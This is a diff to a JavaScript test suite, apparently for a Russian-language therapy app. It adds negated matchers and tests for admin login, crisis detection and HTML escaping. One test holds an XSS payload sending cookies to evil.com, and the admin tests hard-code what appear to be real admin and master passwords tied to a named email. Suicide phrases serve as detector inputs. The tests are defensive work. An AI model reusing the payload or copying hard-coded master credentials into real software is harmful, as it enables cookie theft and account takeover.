@@ -91,7 +91,7 @@ export class TestRunner {
 }
 
 export function expect(actual) {
-  return {
+  const matchers = {
     toBe(expected) {
       if (actual !== expected) {
         throw new Error(`Expected ${JSON.stringify(expected)}, but got ${JSON.stringify(actual)}`);
@@ -153,6 +153,36 @@ export function expect(actual) {
       }
     }
   };
+
+  matchers.not = {
+    toBe(expected) {
+      if (actual === expected) {
+        throw new Error(`Expected ${JSON.stringify(actual)} NOT to be ${JSON.stringify(expected)}`);
+      }
+    },
+    toEqual(expected) {
+      if (JSON.stringify(actual) === JSON.stringify(expected)) {
+        throw new Error(`Expected ${JSON.stringify(actual)} NOT to deep equal ${JSON.stringify(expected)}`);
+      }
+    },
+    toBeTruthy() {
+      if (actual) throw new Error(`Expected ${JSON.stringify(actual)} NOT to be truthy`);
+    },
+    toBeFalsy() {
+      if (!actual) throw new Error(`Expected ${JSON.stringify(actual)} NOT to be falsy`);
+    },
+    toContain(expected) {
+      if (Array.isArray(actual)) {
+        if (actual.includes(expected)) throw new Error(`Array unexpectedly contains ${JSON.stringify(expected)}`);
+      } else if (typeof actual === 'string') {
+        if (actual.includes(expected)) throw new Error(`String unexpectedly contains "${expected}"`);
+      } else {
+        throw new Error(`Cannot call toContain on type ${typeof actual}`);
+      }
+    }
+  };
+
+  return matchers;
 }
 
 // ============================================================================
@@ -367,6 +397,29 @@ export function registerAllTests(runner) {
       expect(auth.isTherapist()).toBe(true);
     });
 
+    runner.it('Вход администратора (Денис Казаков) с альтернативным паролем 28246', async () => {
+      const admin = await auth.login('denis_kazakov@mail.ru', '28246');
+      expect(admin.role).toBe('admin');
+      expect(admin.name).toBe('Денис Казаков');
+      expect(auth.isTherapist()).toBe(true);
+    });
+
+    runner.it('Вход ведущего через loginAsTherapist с паролями 127554 и 28246', async () => {
+      const admin1 = await auth.loginAsTherapist('28246');
+      expect(admin1.role).toBe('admin');
+      expect(admin1.name).toBe('Денис Казаков');
+
+      // Проверка входа с мастер-паролем 127554
+      const admin2 = await auth.loginAsTherapist('127554');
+      expect(admin2.role).toBe('admin');
+    });
+
+    runner.it('Отклоняет неверный пароль любой длины в loginAsTherapist и switchToAdmin (SEC-01)', async () => {
+      await expect(auth.loginAsTherapist('1234')).toReject('Неверный пароль ведущего');
+      await expect(auth.loginAsTherapist('wrongpassword')).toReject('Неверный пароль ведущего');
+      await expect(auth.switchToAdmin('0000')).toReject('Неверный пароль ведущего');
+    });
+
     runner.it('Вход Дениса Казакова по имени «Денис» с паролем 127554', async () => {
       const admin = await auth.login('Денис', '127554');
       expect(admin.role).toBe('admin');
@@ -501,6 +554,16 @@ export function registerAllTests(runner) {
       expect(ai.detectCrisis('порезать себя ночью')).toBe(true);
     });
 
+    runner.it('Кризис-детектор: перехватывает личные глагольные формы 1-го лица (CRIS-01)', () => {
+      expect(ai.detectCrisis('я покончу с собой сегодня')).toBe(true);
+      expect(ai.detectCrisis('убью себя если это повторится')).toBe(true);
+      expect(ai.detectCrisis('кажется, завтра повешусь')).toBe(true);
+      expect(ai.detectCrisis('если не смогу, вскрою вены')).toBe(true);
+      expect(ai.detectCrisis('наглотаюсь таблеток и усну')).toBe(true);
+      expect(ai.detectCrisis('убьюсь о стену')).toBe(true);
+      expect(ai.detectCrisis('порежу вены в ванной')).toBe(true);
+    });
+
     runner.it('Текстовый кризис-детектор: безопасен для обычного текста', () => {
       expect(ai.detectCrisis('Хорошо отдохнул на природе')).toBe(false);
       expect(ai.detectCrisis('')).toBe(false);
@@ -630,6 +693,18 @@ export function registerAllTests(runner) {
       expect(esc(null)).toBe('');
       expect(esc(undefined)).toBe('');
       expect(esc(12345)).toBe('12345');
+    });
+
+    runner.it('Экранирование esc() предотвращает Stored XSS в кризисном блоке и оповещениях (SEC-04)', () => {
+      const maliciousName = '<b onmouseover=alert(1)>Иван</b>';
+      const maliciousNote = '<script>fetch("http://evil.com/"+document.cookie)</script>';
+      const safeName = esc(maliciousName);
+      const safeNote = esc(maliciousNote);
+
+      expect(safeName).not.toContain('<b onmouseover');
+      expect(safeName).toContain('&lt;b');
+      expect(safeNote).not.toContain('<script>');
+      expect(safeNote).toContain('&lt;script&gt;');
     });
   });
 
